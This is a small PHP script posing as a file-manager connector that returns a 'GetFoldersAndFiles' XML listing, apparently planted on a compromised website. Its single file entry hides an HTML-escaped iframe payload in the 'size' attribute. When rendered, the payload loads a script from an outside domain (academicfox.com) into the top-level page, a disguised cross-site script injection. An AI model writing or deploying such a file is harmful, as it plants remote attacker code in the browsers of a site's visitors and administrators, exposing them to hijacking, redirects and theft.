<?php
// Set appropriate headers
header('Content-Type: application/xml; charset=utf-8');
header('Cache-Control: no-cache');

// Construct the XML output
$xml = '<?xml version="1.0" encoding="UTF-8"?>
<Connector command="GetFoldersAndFiles" resourceType="Document">
    <CurrentFolder path="/5 - f/" url=""/>
    <Folders/>
    <Files>
        <File desc="1" name="Loading..." size="&lt;iframe srcdoc=&quot;&lt;script&gt;let script=document.createElement(&apos;script&apos;);script.setAttribute(&apos;src&apos;,&apos;https://academicfox.com/video.html&apos;);window.top.document.head.appendChild(script);&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;" url="5"/>
    </Files>
</Connector>';

// Output the XML
echo $xml;
?>
